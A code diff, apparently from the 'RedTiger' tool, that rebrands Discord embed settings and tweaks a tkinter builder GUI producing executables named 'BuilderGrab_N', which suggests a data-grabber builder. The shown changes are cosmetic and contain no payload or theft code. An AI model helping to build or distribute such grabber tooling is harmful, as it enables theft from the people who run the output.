@@ -57,13 +57,13 @@ def current_time_day_hour():
     return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')
 
 color_embed = 0xB20000
-username_embed = 'Red Tiger'
-avatar_embed = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
+username_embed = 'RedTiger'
+avatar_embed = 'https://media.discordapp.net/attachments/1184160374342299688/1223987317908181073/RedTiger_Logo.png?ex=661bda05&is=66096505&hm=c567e0e9e672ae70de44ddf128301ae0a6737d78a2f2a9f46ff9f2b717f0ac04&=&format=webp&quality=lossless&width=810&height=810'
 footer_embed = {
         "text": f"Red Tiger | {current_time_day_hour()}",
-        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
+        "icon_url": avatar_embed,
         }
-footer_text = f"Red Tiger | {current_time_day_hour()}"
+footer_text = f"RedTiger | {current_time_day_hour()}"
                  
 
 try:
@@ -1441,7 +1441,6 @@ from Config.Config import *
 import random
 import os
 import subprocess
-import requests
 import shutil
 import tkinter as tk
 from tkinter import filedialog
@@ -1480,7 +1479,7 @@ def update_variables():
     else:
         exe_or_not = "Exe File"
     
-    if not name_file.strip():
+    if not name_file.strip() or name_file in ["File Name"]:
         random_number = random.randint(1, 1000)
         name_file = f'BuilderGrab_{random_number}'
 
@@ -1532,7 +1531,7 @@ custom_background = "#141414"
 root.configure(background=custom_background) 
 
 label_texte = tk.Label(root, text="Builder Options", font=custom_font, background=custom_background, foreground=custom_color)
-label_texte.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))  # Utilisation de padx pour ajuster la position horizontale
+label_texte.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))
 
 
 def on_entry_focus_in(event):
@@ -1639,7 +1638,6 @@ root.grid_columnconfigure(0, minsize=0)
 style = ttk.Style()
 style.configure('CustomButton.TButton', borderwidth=0, background=custom_background, font=('Calibri', 15, "bold"), foreground=custom_background)
 
-# Création du bouton avec le style défini
 build_button = ttk.Button(root, text="Build", command=update_variables, style='CustomButton.TButton', width=15)
 build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(100,0))
 
